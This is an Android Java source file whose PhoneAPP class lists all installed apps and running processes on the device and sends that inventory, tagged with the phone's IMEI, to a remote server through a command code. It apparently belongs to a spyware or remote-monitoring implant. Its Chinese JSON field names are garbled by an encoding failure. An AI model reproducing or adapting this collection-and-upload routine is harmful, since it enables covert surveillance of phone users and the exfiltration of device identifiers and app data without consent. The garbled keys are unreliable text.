package com.phone.data;

import java.util.List;

import org.json.JSONArray;
import org.json.JSONObject;

import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.util.Log;


public class PhoneAPP implements Runnable{
	private static final String TAG = "PhoneAPP";
	private Context context;
	
	public PhoneAPP(Context context){
		this.context = context;
	}
	
	public void run(){
    	String appprocss = PhoneAPP.getAppList(context);
    	if(appprocss != null && appprocss.equals("") == false ){
	        SendDataToServer.sendDataToServer(appprocss.getBytes(), appprocss.getBytes().length,
	        		Public.CMD_DATA_APPPROCESS, Public.IMEI);
    	}
	}

	public static String getAppList(Context context){

        JSONArray jsarray=new JSONArray();
        
        JSONArray jsarrayapp=new JSONArray();
        JSONArray jsarraysys=new JSONArray();
        JSONArray jsarrayrun=new JSONArray();
        try{
	        PackageManager manager = context.getPackageManager();
	        List<PackageInfo> pkgList = manager.getInstalledPackages(0);
	        
	        int thirdpartycnt = 0;
	        int systemappcnt = 0;
	        int runappcnt = 0;
	        for (int i = 0; i < pkgList.size(); i++) {
	            PackageInfo pI = pkgList.get(i);
	            
	            String installtime  = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss",pI.firstInstallTime);
	            String updatetime = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss",pI.lastUpdateTime);
				JSONObject jsobj=new JSONObject();
    	   	  	jsobj.put("Ӧ������", pI.applicationInfo.loadLabel(context.getPackageManager()).toString());
    	   	  	jsobj.put("����", pI.packageName);
    	   	  	jsobj.put("��װʱ��", installtime);
    	   	  	jsobj.put("�������ʱ��", updatetime);
    	   	  	jsobj.put("�汾", pI.versionName);
    	   	  	jsobj.put("USERID", pI.sharedUserId);
	            
	            if ( (pI.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {            	
	            	jsobj.put("type", "1");
	    	   	  	jsarrayapp.put(thirdpartycnt,jsobj);
	    	   	  	thirdpartycnt ++;
	            }
	            else{
	            	jsobj.put("type", "2");
	    	   	  	jsarraysys.put(systemappcnt,jsobj);
	    	   	  	systemappcnt ++;
	            }
	        }

			ActivityManager am = (ActivityManager)context.getSystemService("activity");
			List<RunningAppProcessInfo> runapplist = am.getRunningAppProcesses();
			
			for (RunningAppProcessInfo runapp : runapplist) {
				JSONObject jsobj=new JSONObject();
    	   	  	jsobj.put("��������", runapp.processName);
    	   	  	jsobj.put("����ID",String.valueOf(runapp.pid));
    	   	  	jsobj.put("�û�ID", String.valueOf(runapp.uid));
    	   	  	jsobj.put("LRU", String.valueOf(runapp.lru));
    	   	  	jsobj.put("����", String.valueOf(runapp.describeContents()));
    	   	  	jsobj.put("type", "1");
    	   	  	jsarrayrun.put(runappcnt,jsobj);
    	   	  	runappcnt++;
			}
	        
	        jsarray.put(0,jsarrayapp);
	        jsarray.put(1,jsarraysys);
	        jsarray.put(2,jsarrayrun);
        }catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getAppList exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }

        Log.e(TAG, "phone app ok");
        return jsarray.toString();
	}
	
	
	

	
}
